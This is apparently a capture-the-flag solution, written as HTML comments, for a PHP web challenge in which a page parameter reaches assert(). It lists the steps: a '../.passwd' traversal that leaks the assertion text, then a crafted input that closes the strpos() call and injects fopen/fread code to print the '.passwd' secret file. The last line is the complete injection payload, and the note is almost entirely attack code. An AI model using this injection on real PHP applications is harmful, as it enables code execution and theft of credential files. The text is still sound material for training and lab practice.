<!-- 1. find asset() : /?page=../.passwd -->
<!-- 2. look message : Warning: assert(): Assertion "strpos('includes/../.passwd.php', '..') === false" failed in /challenge/web-serveur/ch47/index.php on line 8 Detected hacking attempt! -->
<!-- 3. create new valide query: strpos('includes','..') === false and $flag = fopen('.passwd','r') and print fread($flag, filesize('.passwd')) and strpos('/../.passwd.php', '..') === false -->

<!-- 4.injection = -->
/?page=','..') === false and $flag = fopen('.passwd','r') and print fread($flag, filesize('.passwd')) and strpos('